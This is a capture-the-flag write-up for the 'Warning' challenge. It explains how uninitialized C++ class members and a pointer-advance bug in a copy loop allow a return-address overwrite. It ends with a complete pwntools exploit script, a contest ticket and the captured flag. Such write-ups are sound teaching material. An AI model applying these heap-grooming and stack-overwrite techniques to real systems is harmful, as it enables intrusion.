# Warning

## Challenge

We're provided a C++ binary with source code for building and running the challenge.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

The code revolves around a `Warning` class:

```cpp
class Warning{
    public:
        Warning( );
        ~Warning();
        void get_str();
        void get_input();
        void jump_around(char *start, char *end, char *uncompressed, size_t uncomp_len);
        void output();
        bool check(uint8_t lvl);
    protected:
        int a;
        int b;
        int c;
        char buf[0x10C];
};

// I hate c++
Warning::Warning(): 
    c( 10 ),
    b( c+20 ),
    a( b-5 ){
}
```

Before we can do much with it, we have to pass the `Warning::check` method:

```cpp
bool Warning::check(uint8_t lvl){
    switch(lvl){
        case 1:
            std::cout << "Case 1: " << 0x1000 << std::endl;
            if((a+b-c) == 0x1000){
                std::cout << "Nice." << std::endl;
                return true;
            }
            return false;
        case 2:
            std::cout << "Case 2: " << -256 << std::endl;
            if(a == -256){
                std::cout << "Nicee." << std::endl;
                return true;
            }
            return false;
        default:
            return false;
    }

    return false;
}
```

Despite the variables being listed as `c`, `b`, `a`, they are actually initialized in the reverse order as this is determined by their offsets in the class.
Thus, `a` and `b` are actually initialized using uninitialized memory.
If we can control the initial values of `b` and `c`, we can set up `a` and `b` such that we pass these checks.

Before the check is called, we are allowed to input a line:

```cpp
std::cout << "> " << std::flush;

// I really hate C++
{
    std::string s;
    std::cin >> s;
}
```

The memory is immediately freed, so there is the possibility that our `Warning` class will reclaim this space.
Most attempts resulted in a chunk of size 0x410 which did not get reconsolidated into the wilderness chunk, but sending a larger string, such as 0x500 characters, would force it to reallocate and the larger chunk would be reconsolidated.
Now, when creating a `Warning` instance, it would use space we have previously written to.
We can write characters in our string such that the checks will pass for `w0` and `w1`:

```cpp
Warning* w0 = new Warning();

if(!w0->check(1)){
    goodbye();
}

Warning* w1 = new Warning();

flushcin();
w0->get_str();

if(!w1->check(2)){
    goodbye();
}
```

There is a call to `Warning::get_str`.
This method has a small buffer overflow, allowing us to overwrite part of the next heap chunk:

```cpp
void Warning::get_str(){
    std::cout << "> " << std::flush;
    
    fgets(this->buf, 0x115, stdin);
    return;
}
```

However, this is not necessary for exploitation, as we can set up `w1` to pass its `Warning::check` using the initial string as well.

After passing both checks, we get a leak to the `get_flag` function, and a call to `Warning::get_input`.

```cpp
void Warning::get_input(){
    struct {    
        char buf1[1025];
        char buf2[257];
    } input_bufs = {0};

    flushcin();
    std::cout << "> ";
    if(!fgets(input_bufs.buf1, sizeof(input_bufs.buf1), stdin)){
		exit(-1);
	}
    // Do you like TBONE steak?
    jump_around(input_bufs.buf1, 
                input_bufs.buf1 + 1024,
                input_bufs.buf2, 
                sizeof(input_bufs.buf2));

    printf("Jump! Jump! Jump! Jump!\n");
}
```

This method reads a line into a stack buffer and calls `jump_around`.

```cpp
// Pack it up, pack it in, let me begin
void Warning::jump_around(char *start,
                          char *end,
                          char *uncompressed,
                          size_t uncomp_len){
    // wow this whole function seems so contrived
    // it makes literally no sense
    char *uptr = uncompressed;
    char *bptr = start;
    // The bug in this function would never b a bug in real life
    while(bptr < end && uptr < (uncompressed + uncomp_len)){
        size_t ulen;
        size_t pos = 0;
        char name[63] = {0};

#if !USERINPUT
		if (!convert_label(start, end, ptr, name, NS_MAXLABEL,
					&pos, &comp_pos))
			goto out;

        /*
        * Copy the uncompressed resource record, type, class and \0 to
        * tmp buffer.
        */
#else
        // Give me your con man name
        std::cout << "> ";
        fgets(name, sizeof(name), stdin);

		ulen = strnlen(name, sizeof(name));
#endif
        // Error checking, thats good
        if((uptr - uncompressed) > uncomp_len){
            return;
        }
        strncpy(uptr, name, uncomp_len - (uptr - uncompressed));
        // C++ but pointer math? :thinking_face:
        uptr += ulen;
		*uptr++ = '\0';

        bptr += pos;

        memcpy(uptr, bptr, 10);

        bptr += 10;
        uptr += 10;
    }

    return;
}
```

This copies from `buf1` into `buf2`, 10 characters at a time.
It also allows us to input a `name` every iteration, which is also written into `buf2` and advances the index.

There is bounds checking so that an iteration will not start if our destination index is out of range.
There is also bounds checking to ensure we do not write a `name` past the end of the buffer.
However, if data from a `name` would overflow the buffer, it is truncated, but the index is advanced by the original length, allowing it to go well beyond the end of the buffer.
This will end the loop, but not before we call `memcpy` with the updated index.
We can use this to copy the address of `get_flag` and overwrite the stored return address.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host warning.quals2023-kah5Aiv9.satellitesabove.me --port 5300 warning_public/challenge/warning
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('warning_public/challenge/warning')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'warning.quals2023-kah5Aiv9.satellitesabove.me'
port = int(args.PORT or 5300)
ticket = b'ticket{yankee7041lima4:GPlMbJ-nYgbxGvmgdEAk78TXigjS1dHQcFeIEZuNsz18UCydXXAVQu4KvjwnEGnxhw}'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please:\n', ticket)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

b = -0x100 + 5
c = 0x1000 + 10 + 0x100 - 20

io.sendlineafter(
    b'> ',
    flat({4: b, 8: c, 0x124: b}, length=0x500, word_size = 32)
)

io.sendlineafter(b'> ', b'')

io.recvuntil(b'get_flag: ')
get_flag = int(io.recvline(), 0)

io.success("get_flag: " + hex(get_flag))

io.sendline(b'')
io.sendline(flat([pack(get_flag) + b'\x00' * 2] * 100))

io.sendline(b'A' * 0x61)
io.sendline(b'A' * 0x61)
io.sendline(b'A' * 0x25)

io.interactive()
```

## Flag

```
flag{yankee7041lima4:GLSTeOBuyuIxMm5z3uvJHYTDf816fuyaBF8nx366ULaGvBCXKAsucFT_3VyhDPuCTqcDev1xUB71bU5pj4PnL9I}
```
